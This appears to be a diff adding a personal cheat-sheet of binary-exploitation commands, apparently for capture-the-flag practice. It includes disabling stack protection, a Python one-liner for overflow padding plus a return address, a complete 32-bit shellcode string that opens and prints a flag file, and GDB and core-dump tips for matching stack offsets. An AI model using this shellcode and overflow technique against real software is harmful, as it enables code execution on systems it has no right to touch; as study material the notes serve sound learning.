@@ -1,0 +1,49 @@
+# Compiling and linking shellcode into assembly
+as <filename> -o <filename.o>
+ld <filename.o> -o <outfile> 
+
+# Checking assembly of executable in objdump along with opcodes
+objdump -d <executable>
+
+# Getting shellcode from objdump
+for i in $(objdump -d readflag |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
+
+# Compiling with stack protection turned off
+gcc -w -g -fno-stack-protector eggcode.c -o eggcode
+
+# Print Shellcode and 'A' using Python
+`python -c 'print "\x41" * 504' + "\x73\xde\xff\xbf"
+
+# Shellcode for Read flag in 32 bit
+\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xc0\x50\x68\x66\x6c\x61\x67\x68\x72\x6f\x63\x2f\x68\x2f\x2f\x2f\x70\x89\xe3\xb0\x05\xcd\x80\x89\xc6\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xd2\x39\xc2\x74\x0d\xb2\x01\xb0\x04\xb3\x01\xcd\x80\x83\xc4\x01\xeb\xdf\x31\xdb\xb0\x01\xcd\x80
+
+# Check environment variable and their addresses in GDB
+x/s *((char **)environ)
+
+# Enabling core dump collection in local directory
+ulimit -c unlimited
+
+# An executable has different stack sizes when ruinning in GDB as
+# compared to Shell, due to extra ENV variables, use the commands below
+# to set them to same siz in GDB
+
+# Show ENV variables in GDB
+show env
+
+# To look at ENV variables of executable, run the executable in background and
+# use the following commands
+
+cat /proc/<process_id>/environ | tr \\0 \\n
+
+# To set and unset ENV variables in GDB
+unset env <env name>
+set env <env> name
+
+# You can also look at core dump of the executable to look at memory offset, in GDB
+core <location of dump>
+
+# Change location of core dump
+echo '<location>_%e.%p' | sudo tee /proc/sys/kernel/core_pattern
+
+# Remove new line from end of file
+    tr -d '\n' < days.txt
